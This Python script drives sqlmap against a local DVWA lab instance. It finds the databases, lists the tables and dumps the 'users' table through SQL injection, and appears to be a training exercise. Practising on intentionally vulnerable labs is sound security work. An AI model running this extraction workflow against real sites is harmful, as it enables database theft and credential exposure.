import os
import subprocess

# Create local output directory
output_dir = os.path.join(os.getcwd(), "sqlmap_output")
os.makedirs(output_dir, exist_ok=True)

# Target vulnerable URL
url = "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit"

# Replace with your real session ID from the browser
# Developer Tools -> Application -> Cookies -> PHPSESSID
cookies = "security=low; PHPSESSID=af70ee33e0a23844ed6b5c91d74acbfb"


# Function to execute SQLMap and print status
def run_sqlmap(command_args, description):
    print(f"\n[+] Running: {description}")
    try:
        subprocess.run(command_args, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] SQLMap Error: {e}")


# --------------------------------------------
# Step 1: Find available databases
# Equivalent SQLMap CLI:
# sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=..." --batch --dbs --output-dir="./sqlmap_output"
# --------------------------------------------
cmd_dbs = [
    "sqlmap",
    "-u",
    url,
    "--cookie",
    cookies,
    "--batch",
    "--dbs",
    "--output-dir",
    output_dir,
]
run_sqlmap(cmd_dbs, "Step 1: Finding Databases")

# --------------------------------------------
# Step 2: List tables from a known database
# Equivalent SQLMap CLI:
# sqlmap -u "http://localhost:8080/..." --cookie="..." --batch -D dvwa --tables --output-dir="./sqlmap_output"
# --------------------------------------------
db_name = "dvwa"
cmd_tables = [
    "sqlmap",
    "-u",
    url,
    "--cookie",
    cookies,
    "--batch",
    "-D",
    db_name,
    "--tables",
    "--output-dir",
    output_dir,
]
run_sqlmap(cmd_tables, f"Step 2: Listing Tables in Database '{db_name}'")

# --------------------------------------------
# Step 3: Dump data from a specific table
# Equivalent SQLMap CLI:
# sqlmap -u "http://localhost:8080/..." --cookie="..." --batch -D dvwa -T users --dump --output-dir="./sqlmap_output"
# --------------------------------------------
table_name = "users"
cmd_dump = [
    "sqlmap",
    "-u",
    url,
    "--cookie",
    cookies,
    "--batch",
    "-D",
    db_name,
    "-T",
    table_name,
    "--dump",
    "--output-dir",
    output_dir,
]
run_sqlmap(cmd_dump, f"Step 3: Dumping Data from Table '{table_name}'")

# --------------------------------------------
# Done! Print the output folder path
# --------------------------------------------
print(f"\n[✓] All SQLMap output has been saved to: {output_dir}")
